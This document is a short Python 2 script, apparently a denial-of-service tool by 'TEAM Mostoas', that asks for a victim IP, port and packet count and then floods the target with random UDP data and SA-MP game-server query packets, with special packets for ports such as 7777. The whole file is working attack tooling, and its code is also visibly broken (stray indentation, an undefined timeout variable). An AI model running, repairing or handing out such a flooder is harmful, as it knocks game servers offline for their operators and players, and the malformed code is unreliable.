#!/usr/bin/env python2
import socket, struct, codecs, sys, threading, random, time, os

Data = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

print("\x1b[1m\x1b[31m--- AUTHOR BY : Mostoas ---")
print("--- TOOLS BY : TEAM Mostoas ---")
print("--- JANGAN ABUSE YA ---")
print("===================================")
print("DDOS FOR SAMP, ULTRA - HOST, 20GTPS")
print("========== VERSION 1.0 ============")
print
victim = str(input("IP/HOST╠════════>> "))
vport = int(input("PORT╚═════════>> "))
sent = int(input("SEND PACKETS╚═════════>> "))

    # okay so here I create the server, when i say "client_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1000 representes one byte to the server
    bytes = random._urandom(1000)
    byte = random._urandom(2000)
    byt = random._urandom(1475)
    timeout =  time.time() + duration

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        client.sendto(byte, (victim, vport))
        client.sendto(byt, (victim, vport))
        msg = Data[random.randrange(0, 3)]
        client.sendto(bytes, (victim, int(vport)))
        client.sendto(msg, (victim, int(vport)))
        if int(vport) == 7777:
            client.sendto(Data[5], (victim, int(vport)))
        elif int(vport) == 7792:
            client.sendto(Data[4], (victim, int(vport)))
        elif int(vport) == 7771:
            client.sendto(Data[6], (victim, int(vport)))
        elif int(vport) == 7784:
            client.sendto(Data[7], (victim, int(vport)))
        sent = sent + 1
        print " DDOS ATTACK BY MOSTOAS %s MEMBUNUH SERVER !! %s PORT %s "%(sent, victim, vport)